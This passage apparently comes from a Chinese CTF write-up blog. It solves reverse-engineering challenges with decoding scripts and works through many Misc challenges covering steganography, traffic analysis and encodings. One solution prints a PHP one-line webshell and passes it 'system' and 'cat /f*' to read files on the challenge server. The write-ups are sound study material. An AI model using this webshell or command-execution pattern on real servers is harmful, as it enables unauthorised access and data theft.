v14[5] == 0x7AFCBCA32) s.add(38 * v14[5] + 32 * v14[4] - v14[6] - v14[7] == 0x139360369D) s.add(v14[4] + 41 * v14[6] - v14[5] - 25 * v14[7] == 0x653CABE3E) v4=[] if(s.check()==sat): m=s.model() for i in range(8): v4.append(hex(int(str(m[v14[i]])))[2:]) print(v4) for i in range(8): for j in range(4): print(chr(int(v4[i][j*2:j*2+2],16)),end=&quot;&quot;) 7、任天堂玩家8、Ron’s CodeRC4算法逆向 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970def rc4(data, key): &#x27;&#x27;&#x27; data: data that to be encrypted or decrypted. key: key to encrypt or decrypt. &#x27;&#x27;&#x27; #if the data is a string, convert to hex format. if(type(data) is type(&quot;string&quot;)): tmpData=data data=[] for tmp in tmpData: data.append(ord(tmp)) #if the key is a string, convert to hex format. if(type(key) is type(&quot;string&quot;)): tmpKey=key key=[] for tmp in tmpKey: key.append(ord(tmp)) #the Key-Scheduling Algorithm x = 0 box= list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] #the Pseudo-Random Generation Algorithm x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) result=&quot;&quot; printable=True for tmp in out: if(tmp&lt;0x21 or tmp&gt;0x7e): # there is non-printable character printable=False break result += chr(tmp) if(printable==False): result=&quot;&quot; #convert to hex string for tmp in out: result += &quot;&#123;0:02X&#125;&quot;.format(tmp) return resultstr=[0xE8,0x30,0xE8,0x30,0xC9,0x65,0xA9,0xBA,0x77,0xDA,0xF4,0x4E,0xE3,0xE9,0x60,0x76,0xC1]key1=&#x27;ISCC2021&#x27;.encode()key=[]for i in range(len(key1)): key.append(key1[i] +i)print(key) flag = rc4(bytes(str),bytes(key)) flag=bytes.fromhex(flag)flag=list(flag) key=list(key1) for i in range(len(str)): flag[i] += key[i%8] flag[i] -= 1print(bytes(flag)) 得到flag 1ISCC&#123;reverse_rc4&#125; 9、Ruststr64位程序打开后 定位到iscc_reverse::main函数 f5反汇编发现一串base64 15EKEJusuo7pq81HxZJdOCj5LUQePeWBbmw== 使用如下脚本进行解密 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556b = [0x9A, 0x78, 0xB6, 0x12, 0xBE, 0x66, 0x8D, 0xCF, 0x51, 0x9E, 0x63, 0xCB, 0x4A, 0xD1, 0x1A, 0x59, 0x78, 0x1C, 0x17, 0x73, 0xF2, 0x1D, 0x05, 0x2F, 0xF0, 0xD7, 0xB3, 0x22, 0x5D, 0xAD, 0x0B, 0xE2]table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;decode=&quot;5EKEJusuo7pq81HxZJdOCj5LUQePeWBbmw==&quot; x=&quot;&quot;.join(map(lambda x:bin(table.index(x))[2:].zfill(6),decode))c=[]for i in range((len(x))//8): c.append(int(&#x27;0b&#x27;+x[i*8:(i+1)*8],2)) print(hex(c[i]),end=&quot; &quot;) #print(&quot;!&quot;),debug test运行m = []for i in range(len(c)): m.append(c[i]^b[i]) print(&quot;1&quot;)key = [0x32, 0x63, 0x65, 0x61, 0x39, 0x66, 0x30, 0x34, 0x63, 0x36, 0x33, 0x62, 0x34, 0x32, 0x38, 0x33, 0x39, 0x34, 0x30, 0x65, 0x63, 0x30, 0x65, 0x36, 0x64, 0x32, 0x39, 0x62, 0x65, 0x32, 0x38, 0x64]def lll(a,b): if a&gt;b: return 0 else: return -1f = &#x27;&#x27;for i in range(len(m)): for j in range(128): if (lll((key[i]+0xd0)&amp;0xff,0xa) + j +2)&amp;0xff == m[i]: f += chr(j) print(f) breakp = list(f[::-1])print()def ppp(num): a = num&amp;1 return a==0for i in range(len(p)): if ord(&#x27;a&#x27;)&lt;=ord(p[i])&lt;=ord(&#x27;z&#x27;): p[i] = chr(ord(p[i])^0x20) elif ord(&#x27;A&#x27;)&lt;=ord(p[i])&lt;=ord(&#x27;Z&#x27;): p[i] = chr(ord(p[i])^0x20) elif ord(&#x27;0&#x27;) &lt;=ord(p[i])&lt;=ord(&#x27;9&#x27;): a = ord(p[i]) + 1 b = ord(p[i]) - 1 if ppp(ord(p[i])): p[i] = chr(a) else: p[i] = chr(b) else: passfor i in range(len(p)): print(p[i],end=&#x27;&#x27;) 得到flag 1ISCC&#123;Reverse-90L8T-ft319&#125; 10、JustDoIt32位程序找到目标程序 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int __cdecl main_0(int argc, const char **argv, const char **envp)&#123; int i; // [esp+D0h] [ebp-5Ch] char v5[28]; // [esp+DCh] [ebp-50h] BYREF int v6; // [esp+F8h] [ebp-34h] char v7[12]; // [esp+104h] [ebp-28h] BYREF char v8[15]; // [esp+110h] [ebp-1Ch] char v9[5]; // [esp+11Fh] [ebp-Dh] BYREF __CheckForDebuggerJustMyCode(&amp;unk_5DF029); v8[0] = 23; v8[1] = 68; v8[2] = 68; v8[3] = 15; v8[4] = 94; v8[5] = 10; v8[6] = 8; v8[7] = 10; v8[8] = 6; v8[9] = 95; v8[10] = 8; v8[11] = 24; v8[12] = 87; v8[13] = 3; v8[14] = 26; strcpy(v9, &quot;i&quot;); v9[2] = 0; *(_WORD *)&amp;v9[3] = 0; qmemcpy(v7, &quot;ISCC&quot;, 4); v6 = 16; sub_4865AD((int)&amp;unk_5DC488, (char *)&amp;byte_5A04DC); sub_484D2F(&amp;dword_5DC3E0, v5); sub_487C91(v5, v7, v6); for ( i = 0; i &lt; v6; ++i ) &#123; if ( v5[i] != v8[i] ) &#123; sub_4865AD((int)&amp;unk_5DC488, &quot;Please enter the true flag!\\n&quot;); j__system(&quot;pause&quot;); return 0; &#125; &#125; sub_4865AD((int)&amp;unk_5DC488, &quot;The flag is true!\\n&quot;); j__system(&quot;pause&quot;); return 0;&#125; 显然v8是加密后的密文v6存储的是数组长度 决定循环次数v5存储了明文接下来看看加工函数的内容 123456789101112131415161718192021222324252627282930int __cdecl sub_499080(char *a1, char *a2, int a3)&#123; int result; // eax char v4; // [esp+D0h] [ebp-20h] int i; // [esp+E8h] [ebp-8h] int j; // [esp+E8h] [ebp-8h] int k; // [esp+E8h] [ebp-8h] int m; // [esp+E8h] [ebp-8h] __CheckForDebuggerJustMyCode(&amp;unk_5DF029); for ( i = 0; i &lt; a3; ++i ) a1[i] -= 60; v4 = *a1; for ( j = 0; j &lt; a3 - 1; ++j ) a1[j] = a1[j + 1]; a1[a3 - 1] = v4; for ( k = 1; k &lt; a3; ++k ) a1[k] += k; for ( m = 1; ; ++m ) &#123; result = m; if ( m &gt;= a3 ) break; a1[m] += a2[1] / 7 + *a2 % 7; a1[m] = a1[m] - a2[2] % 6 - a2[3] / 6; a1[m] += a2[m % 4] % 5; a1[m] ^= *a2; &#125; return result;&#125; 先是全部-60然后每一位提前一位","categories":[{"name":"学校相关","slug":"学校相关","permalink":"http://xxxkkk578.github.io/categories/%E5%AD%A6%E6%A0%A1%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/tags/CTF/"}]},{"title":"BUUCTF篇-Misc部分题解","slug":"buu_misc","date":"2024-04-09T16:25:43.000Z","updated":"2024-04-10T11:15:32.945Z","comments":true,"path":"2024/04/10/buu_misc/","permalink":"http://xxxkkk578.github.io/2024/04/10/buu_misc/","excerpt":"","text":"MISC1、[NewStarCTF 2023 公开赛道]机密图片zsteg 1zsteg secret.png 2、[NewStarCTF 2023 公开赛道]CyberChef’s Secret加密 1M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA= cyber_chef 选择magic参数 即可获得flag 3、[NewStarCTF 2023 公开赛道]流量！鲨鱼！wireshark打开导出http对象使用cyber_chef magic解密 4、[NewStarCTF 2023 公开赛道]压缩包们发现压缩包损坏 不见pk头补上50 4B 03 04解压得又一个压缩包尝试解压 报错查看zip文件时在备注发现一串base64编码 1SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg== 解密后 1I like six-digit numbers because they are very concise and easy to remember. 说明密码六位 爆破即可使用ziperello破解得密码为232311banzip修复flag.zip解压得到flag 5、[NewStarCTF 2023 公开赛道]隐秘的眼睛图片上有很多小灰斑使用silenteye解码即可 6、[NewStarCTF 2023 公开赛道]空白格WhiteSpace是一种只用空白字符（空格，Tab，回车）编程的语言在如下网站上可以解码 1https://vii5ard.github.io/whitespace/ 7、[NewStarCTF 2023 公开赛道]永不消逝的电波摩斯密码加电波 8、[NewStarCTF 2023 公开赛道]base!base64隐写使用如下脚本进行解密 12345678910111213# coding:gbkimport base64b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;#在这一行我们的工作就是简单的做一个base64的参照表，后面会解释作用。with open(&#x27;base.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = str(line, &quot;utf-8&quot;).strip(&quot;\\r&quot;).strip(&#x27;\\n&#x27;)#输出的时候好像还是有回车 rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), &quot;utf-8&quot;).strip(&quot;\\r\\n&quot;)#要加“utf-8”不加会报错 equalnum = stegb64.count(&#x27;=&#x27;) if equalnum:#刚刚从我们的分析过程中可以看到，如果在一串base64编码的字符串中，没有等号是不可能隐藏数据的，所以这里要判断一 offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1]))#这里要算一下偏移量，可能就这么说偏移量大家可能不是很懂，我就用简单通俗的话来讲吧。如果咱们不去隐写数据的话，最后补位的一定全是零，那么用咱们得到的隐写数据的二进制减去那些补位是零的二进制数据（他们两个的头部都是从前面继承的），那么就会得到咱们隐写进去的非零二进制数据。 bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)])) 之后再放入cyberchef magic解密 得到flag base58加密 9、[NewStarCTF 2023 公开赛道]WebShell的利用php源码混淆解密 1234567&lt;?php//加密方式：php源码混淆类加密。免费版地址:http://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 ?&gt;&lt;?phperror_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);?&gt; 则结合题目 1我们在服务器上发现了一个奇奇怪怪的WebShell，研究一下如何利用它去获取服务器权限吧（index.php即为WebShell，直接交互即可） 传参即可 1http://3446ac3e-a9f6-4edf-8bd9-e663aa1a4b0a.node5.buuoj.cn:81/index.php?7d67973a=system POST参数 19fa3=cat /f* 10、[NewStarCTF 2023 公开赛道]1-序章编写如下python脚本利用日志 1234567891011121314151617import urllib.parsef = open(&quot;access.txt&quot;,&quot;r&quot;).readlines()s = []for i in range(0,3523): data = urllib.parse.unquote(f[i])#url解码 payload = data.split(&quot;or&quot;)[2]#截取and后面的字符 number = payload.find(&quot;from user),&quot;)#确定大概的位置 data1 = payload[number+ 11:].split(&quot;,&quot;)[0]#取第一个数据 data2 = payload[number + 11:].split(&quot;=&quot;)[1].split(&quot;,&quot;)[0]#取&gt;后的数据 s.append([data1,data2]) #转码输出for i in range(1,len(s)): if (s[i][0] != s[i-1][0]): print(chr(int(s[i-1][1])),end=&quot;&quot;)#输出变化前的最后一个字符 11、[NewStarCTF 2023 公开赛道]Jvavjava盲水印 使用blindwatermark工具加上隐藏的水印 1java -jar .\\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c .\\challenge.png 1.png 12、[NewStarCTF 2023 公开赛道]新建Word文档word里啥也没有另存为xml文件可以看到内容再复制 1新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑 出来到 新约佛论禅 佛曰解密即可 1http://hi.pcmoe.net/buddha.html 13、[V&amp;N2020 公开赛]拉胯的三条命令tcp三次握手 在kali上运行如下命令 1tcpdump -n -r nmapll.pcapng &#x27;tcp[13] = 18&#x27; | awk &#x27;&#123;print $3&#125;&#x27; | sort -u 得到 123456reading from file nmapll.pcapng, link-type EN10MB (Ethernet), snapshot length 262144127.0.0.1.21127.0.0.1.22127.0.0.1.3306127.0.0.1.631127.0.0.1.801 则flag 1flag&#123;21226318013306&#125; 14、[NewStarCTF 2023 公开赛道]隐秘的图片放进stegsolve里analyseimage combiner将两张图片异或即可 15、[NewStarCTF 2023 公开赛道]Nmap限定tcp分组列表 字符串 搜索 1SYN, ACK 记录source port即可 16、[NewStarCTF 2023 公开赛道]R通大残1zsteg secrect.png -a 17、[NewStarCTF 2023 公开赛道]依旧是空白使用工具爆破图片宽高并修复获得密码 1s00_b4by_f0r_y0u snow隐写 1SNOW.EXE -p s00_b4by_f0r_y0u -C White.txt 18、[Dest0g3 520迎新赛]你知道js吗wingding是字符 将字体切换为宋体之后 base64解密 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;&lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;requestedExecutionLevel level=&quot;asInvoker&quot; uiAccess=&quot;false&quot;/&gt;&lt;application xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt; &lt;dpiAwareness xmlns=&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;&gt;Do you know js&lt;/dpiAwareness&gt;&lt;script language=&quot;javascript&quot;&gt;document.write(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;));&lt;/script&gt; 控制台 1console.log(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;)); 得到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;html&gt;&lt;body&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Do You Know js&lt;/title&gt;&lt;HTA:APPLICATION APPLICATIONNAME=&quot;Do You Know js&quot; ID=&quot;Inception&quot; VERSION=&quot;1.0&quot; SCROLL=&quot;no&quot;/&gt; &lt;style type=&quot;text/css&quot;&gt;&lt;/head&gt; &lt;div id=&quot;feature&quot;&gt; &lt;div id=&quot;content &lt;/style&gt; &lt;h1 id=&quot;unavailable&quot; class=&quot;loading&quot;&gt;Building js.....&lt;/h1&gt; &lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt; function RunFile() &#123; var WshShell = new ActiveXObject(&quot;WScript.Shell&quot;); WshShell.Run(&quot;notepad %windir%/Desktop/js.txt&quot;, 1, false); /* var oExec = WshShell.Exec(&quot;notepad&quot;); */ &#125; &lt;/script&gt; &lt;/div&gt; &lt;/div&gt;&lt;body&gt; &lt;input type=&quot;button&quot; value=&quot;Implant Inception Here&quot; onclick=&quot;RunFile();&quot;/&gt; &lt;p style=&quot;color:white;&quot;&gt;+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- -.-.- --.++ ++++.+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- &gt;---&lt; ]&gt;--- ---.+ ++++. -----.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+ +++++ .---- -.++. ++.+.--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- .+.-. ---.+ ++.+. -.++++.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.----.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ .---- .+.++ ++.-- --.++++.-. ----. +.-.+ ++++. &lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;&lt;/p&gt;&lt;/body&gt;&lt;/body&gt; &lt;/html&gt; brainfuck解密 1446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D 每两位分割 将十六进制转成ascii 12345678910111213s = &#x27;446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D&#x27;dic = []count = 0for i in range(0,len(s),2): dic.append(s[i:i+2]) flag = &#x27;&#x27;for i in dic: try: flag += chr(int(i,16)) except: passprint(flag) 19、[Dest0g3 520迎新赛]Pngenius先zsteg查看图片 发现一个password再binwalk分离 得到压缩包使用password解开压缩包 得到flag 20、[BJDCTF 2nd]A_Beautiful_Picture爆破宽高即可 1flag&#123;PnG_He1ghT_1s_WR0ng&#125; 21、[BJDCTF 2nd]小姐姐-y1nglinux中运行 1strings xiaojiejie.png | grep BJD 得到flag 1flag&#123;haokanma_xjj&#125; 22、[NewStarCTF 2023 公开赛道]大怨种打开图片有张二维码一闪而过使用stegsolve的frame browser模块即可然后汉信码识别即可 1https://tuzim.net/hxdecode/ 23、[NewStarCTF 公开赛赛道]奇怪的文本字频统计即可 24、[NewStarCTF 公开赛赛道]qsdz’s girlfriend 11我失忆了，这是我在我桌面上发现的压缩包，可是我忘记了压缩包密码了...请问你能帮助我找到我女朋友的名字吗？flag格式为：flag&#123;女朋友名字_女朋友生日&#125; 解压压缩包需要密码打开压缩包 在注释里面找到了提示 1压缩包密码是我女朋友的生日！ 则ziperello爆破8位数字 猜测20开头 爆破得到密码 120031201 得到一张图片 谷歌识图找到名字即可 25、[Dest0g3 520迎新赛]EasyEncode爆破数字密码 1100861 打开后发现是摩斯密码 –..的翻译后是一大堆数字十六进制转ascii发现是unicode 因为都是\\uunicode解码后 又得到一串字符 1RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D 直接cyberchef 是base64加密 26、[NewStarCTF 公开赛赛道]Whats HTTPwireshark打开后 导出http对象 发现文件 1ssssssecret python 12import base64b64decode(&#x27;NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==&#x27;) 之后得到 1b&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27; 再运行 1bytes.fromhex(&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27;) 27、[2022DASCTF MAY 出题人挑战赛]不懂PCB的厨师不是好黑客payload 在对应文件夹内运行即可 1grep -rn &#x27;DASCTF&#x27; ./* 28、[BJDCTF 2nd]最简单的misc-y1ngzip伪加密缺少png头 补上即可 189 50 47 4e 图片上有一串数字 142A447B79316E677A756973687561697D hex解码即可得到flag 29、[陇原战”疫”2021网络安全大赛]soEasyCheckin一开始解码失败发现是因为混入了一个$字符 删除后 对剩余两部分分别进行解码前半部分是base32 解码出来之后得到 1平等和谐自由平等平等自由法治友善平等平等民主公正敬业和谐文明平等爱国公正敬业公正诚信自由和谐民主平等爱国公正敬业公正平等和谐文明自由友善公正公正敬业和谐自由文明友善法治自由友善公正公正友善敬业公正诚信自由公正法治和谐和谐平等敬业法治平等公正民主公正诚信自由和谐 核心价值观编码解码时抱错 把最后两个和谐删除即可得到前半部分的flag 1SET&#123;Qi2Xin1Xie2Li4-Long3Yuan 再解码后半部分base32后乱码 原因是长度不够 在前面添上777解码成功将得到的内容 hex解码 16988ee5b9b3e7ad89e58f8be59684e887aae794b1e585ace6ada3e788b1e59bbde585ace6ada3e6b091e4b8bbe585ace6ada3e58f8be59684e788b1e59bbde5928ce8b090e887aae794b1e5b9b3e7ad89e695ace4b89ae585ace6ada3e695ace4b89ae5928ce8b090e887aae794b1e6b395e6b2bbe8af9ae4bfa1e5928ce8b090 乱码 删除掉第一个6之后即可正常解码 再次核心价值观解码即可得到后半段flag 1Zhan4Yi4&#125; 拼接 1SET&#123;Qi2Xin1Xie2Li4-Long3YuanZhan4Yi4&#125; yuan后面应该还有一个数字 经测试 